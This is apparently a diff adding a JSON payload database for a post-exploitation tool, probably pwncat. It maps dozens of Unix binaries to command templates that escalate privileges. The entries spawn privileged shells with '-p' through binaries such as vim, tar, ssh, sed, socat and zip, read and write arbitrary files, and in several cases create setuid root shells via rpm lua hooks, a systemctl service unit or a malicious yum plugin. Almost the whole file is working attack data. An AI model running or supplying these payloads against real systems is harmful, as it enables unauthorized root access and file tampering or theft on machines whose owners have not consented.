+    }
+  ],
+  "python2.7": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "args": [
+        ""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "rake": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-p",
+        "'`{shell} 1>&0`'"
+      ]
+    }
+  ],
+  "redcarpet": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} | {sed} 's/^<p>//g' | {sed} 's|</p>$||g'",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "rlwrap": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-H",
+        "/dev/null",
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "rpm": [
+    {
+      "type": "shell",
+      "payload": "export TS=$({mktemp} -u); cp {shell} $TS; {command}; $TS -p; {rm} -f $TS",
+      "input": "rm -f $TS\nunset TS\n",
+      "args": [
+        "--eval",
+        "\"%{{lua:posix.chown('$TS',0,0);posix.chmod('$TS', '+s');}}\""
+      ]
+    }
+  ],
+  "rpmquery": [
+    {
+      "type": "shell",
+      "payload": "export TS=$({mktemp} -u); cp {shell} $TS; {command}; $TS -p; {rm} -f $TS",
+      "input": "rm -f $TS\nunset TS\n",
+      "args": [
+        "--eval",
+        "\"%{{lua:posix.chown('$TS',0,0);posix.chmod('$TS', '+s');}}\""
+      ]
+    }
+  ],
+  "rsync": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-e",
+        "'{shell} -p -c \"{shell} -p 0<&2 1>&2\"'",
+        "127.0.0.1:/dev/null"
+      ]
+    }
+  ],
+  "ruby": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "ruby2.5": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "run-parts": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "--new-session",
+        "--regex",
+        "'^bash$'",
+        "/bin",
+        "--arg='-p'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "--new-session",
+        "--regex",
+        "'^sh$'",
+        "/bin",
+        "--arg='-p'"
+      ]
+    }
+  ],
+  "scp": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo '{shell} 0<&2 1>&2' > $TF; {chmod} +x \"$TF\"; {command}",
+      "args": [
+        "-S",
+        "$TF",
+        "x",
+        "y:"
+      ]
+    }
+  ],
+  "screen": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}"
+      ]
+    }
+  ],
+  "script": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-qc",
+        "{shell}",
+        "/dev/null"
+      ]
+    }
+  ],
+  "sed": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-n",
+        "'1e exec {shell} -p 1>&0'",
+        "/etc/hosts"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "''",
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-n",
+        "'s/\\(.\\)/\\1/w {lfile}'"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "service": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "../../{shell} -p"
+      ]
+    }
+  ],
+  "setarch": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "$({arch})",
+        "{shell} -p"
+      ]
+    }
+  ],
+  "sftp": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-o",
+        "ProxyCommand=';{shell} -p 0<&2 1>&2'",
+        "x"
+      ]
+    }
+  ],
+  "shuf": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-z",
+        "{lfile}"
+      ]
+    }
+  ],
+  "socat": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "STDIN",
+        "EXEC:{shell},nofork,pty"
+      ],
+      "exit": "exit\n"
+    },
+    {
+      "type": "read",
+      "payload": "{command}",
+      "args": [
+        "-u",
+        "FILE:{lfile}",
+        "STDOUT"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "-u",
+        "STDIN",
+        "CREATE:{lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{base64} -d | {command} 2>/dev/null",
+      "args": [
+        "-u",
+        "STDIN",
+        "CREATE:{lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "soelim": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} | {tail} -n +2",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "sort": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-m",
+        "{lfile}"
+      ]
+    }
+  ],
+  "sqlite3": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "/dev/null",
+        "'.shell {shell} -p'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "echo -e \"CREATE TABLE t(line TEXT);\\n.import {lfile} t\\nSELECT * FROM t;\\n\" | {command}",
+      "args": [
+        ""
+      ]
+    }
+  ],
+  "ssh": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-o",
+        "ProxyCommand=';{shell} -p 0<&2 1>&2'",
+        "x"
+      ]
+    }
+  ],
+  "start-stop-daemon": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-n",
+        "$RANDOM",
+        "-S",
+        "-x",
+        "{shell}",
+        "--",
+        "-p"
+      ]
+    }
+  ],
+  "stdbuf": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-i0",
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "strace": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-o",
+        "/dev/null",
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "strings": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "x86_64-linux-gnu-strings": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "x86-linux-gnu-strings": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "systemctl": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp} -u).service; TS=$({mktemp} -u); echo -e \"[Service]\\nType=oneshot\\nExecStart={shell} -c 'cp {shell} $TS; {chmod} +sx $TS;'\\n[Install]\\nWantedBy=multi-user.target\" > $TF; {command} link $TF; {command} enable --now $TF; $TS -p",
+      "args": []
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "!{shell} -p\n",
+      "exit": "exit\n{ctrl_c}",
+      "args": []
+    }
+  ],
+  "tac": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-s",
+        "'_-_PWNCAT_RANDOM_DELIM_-_'",
+        "{lfile}"
+      ]
+    }
+  ],
+  "tail": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c1GB",
+        "{lfile}"
+      ]
+    }
+  ],
+  "tar": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-cf",
+        "/dev/null",
+        "/dev/null",
+        "--checkpoint=1",
+        "--checkpoint-action=exec={shell} -p"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "xf",
+        "/dev/null",
+        "-I",
+        "'{shell} -p -c \"{shell} -p <&2 1>&2\"'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} 2>&1",
+      "args": [
+        "xf",
+        "{lfile}",
+        "-I",
+        "'{sh} -c \"{cat} 1>&2\"'"
+      ]
+    }
+  ],
+  "taskset": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "1",
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "tclsh": [
+    {
+      "type": "shell",
+      "payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp}); echo 'exec {shell} -p <@stdin >@stdout 2>@stderr; exit' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    }
+  ],
+  "tee": [
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{base64} -d | {command} >/dev/null",
+      "args": [
+        "{lfile}"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "time": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "timeout": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "--foreground",
+        "7d",
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "tmux": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "{shell}"
+      ]
+    }
+  ],
+  "ul": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "unexpand": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-t99999999",
+        "{lfile}"
+      ]
+    }
+  ],
+  "uniq": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "unshare": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "uuencode": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} | {uudecode}",
+      "args": [
+        "{lfile}",
+        "/dev/stdout"
+      ]
+    }
+  ],
+  "valgrind": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-q",
+        "{shell}"
+      ]
+    }
+  ],
+  "vi": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':!exec {shell} -p'",
+        "-c",
+        "':q'"
+      ],
+      "exit": "exit\n\n"
+    }
+  ],
+  "vim": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':!exec {shell} -p'",
+        "-c",
+        "':q'"
+      ],
+      "exit": "exit\n\n"
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':py import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':lua os.execute(\"reset; exec {shell}\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-es",
+        "'+%print'",
+        "'+:q!'",
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{cat} - | {command}",
+      "args": [
+        "-es",
+        "'+%print'",
+        "'+:w! {lfile}'",
+        "'+:q!'",
+        "/dev/stdin"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "vim.basic": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':!exec {shell} -p'",
+        "-c",
+        "':q'"
+      ],
+      "exit": "exit\n\n"
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':py import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':lua os.execute(\"reset; exec {shell}\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-es",
+        "'+%print'",
+        "'+:q!'",
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{cat} - | {command}",
+      "args": [
+        "-es",
+        "'+%print'",
+        "'+:w! {lfile}'",
+        "'+:q!'",
+        "/dev/stdin"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "rvim": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':!exec {shell} -p'",
+        "-c",
+        "':q'"
+      ],
+      "exit": "exit\n\n"
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':py import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "':lua os.execute(\"reset; exec {shell}\")'",
+        "-c",
+        "'quit'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-es",
+        "'+%print'",
+        "'+:q!'",
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{cat} - | {command}",
+      "args": [
+        "-es",
+        "'+%print'",
+        "'+:w! {lfile}'",
+        "'+:q!'",
+        "/dev/stdin"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "wish": [
+    {
+      "type": "shell",
+      "payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp}); echo 'exec {shell} -p <@stdin >@stdout 2>@stderr; exit' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    }
+  ],
+  "xargs": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-a",
+        "/dev/null",
+        "{shell}",
+        "-p"
+      ],
+      "exit": "exit\n"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-a",
+        "{lfile}",
+        "-0"
+      ]
+    }
+  ],
+  "xxd": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} {lfile} | {command} -r ",
+      "args": []
+    },
+    {
+      "type": "write",
+      "stream": "raw",
+      "payload": "{xxd} -l {length} | {command}",
+      "args": [
+        "-r",
+        "-",
+        "{lfile}"
+      ]
+    }
+  ],
+  "yum": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp} -d); {cat} >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\n{cat} >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\n{cat} >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n    os.execl('{shell}','{shell}')\nEOF\n\n{command} -c $TF/x --enableplugin=y",
+      "args": []
+    }
+  ],
+  "zip": [
+    {
+      "type": "shell",
+      "payload": "TF=none; {command} --help >/dev/null; TF=$({mktemp} -u); {command} $TF /etc/hosts -T -TT '{shell} #'",
+      "args": []
+    }
+  ],
+  "zsh": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{shell} -p\""
+      ]
+    }
+  ]
+}
